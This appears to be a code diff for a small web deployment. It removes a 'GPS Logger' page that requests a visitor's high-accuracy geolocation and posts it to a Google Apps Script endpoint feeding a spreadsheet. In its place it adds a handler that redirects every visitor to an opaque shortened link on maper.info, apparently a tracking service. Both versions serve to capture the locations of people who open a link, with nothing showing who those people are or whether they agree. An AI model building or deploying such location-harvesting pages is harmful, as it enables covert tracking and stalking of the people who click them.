@@ -1,45 +1,5 @@
-<!doctype html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
-<body>
-  <h3>GPS Logger</h3>
-  <div id="status">Requesting location…</div>
-
-  <script>
-    const endpoint = "https://script.google.com/macros/s/AKfycbye3c7z_qXAiGZE1KcJm9EQth0Lrin2AOFBmKJAGzskNMUYtpsSh3XDUIxZdLlMG5oegw/exec";
-
-    function show(msg) { document.getElementById("status").innerText = msg; }
-
-    if (!navigator.geolocation) {
-      show("Geolocation not supported by this browser.");
-    } else {
-      navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true, timeout:10000});
-    }
-
-    function success(pos) {
-      const payload = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        timestamp: new Date().toISOString()
-      };
-
-      fetch(endpoint, {
-        method: "POST",
-        mode: "cors",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      })
-      .then(r => {
-        if (r.ok) show("✅ Location sent. Check your Google Sheet.");
-        else show("❌ Endpoint returned status " + r.status);
-      })
-      .catch(err => show("❌ Network error: " + err));
-    }
-
-    function error(e) {
-      show("Location error: " + (e && e.message ? e.message : "permission denied or unavailable"));
-    }
-  </script>
-</body>
-</html>
+export default {
+  async fetch() {
+    return Response.redirect("https://maper.info/2a7Hd6", 302);
+  }
+};
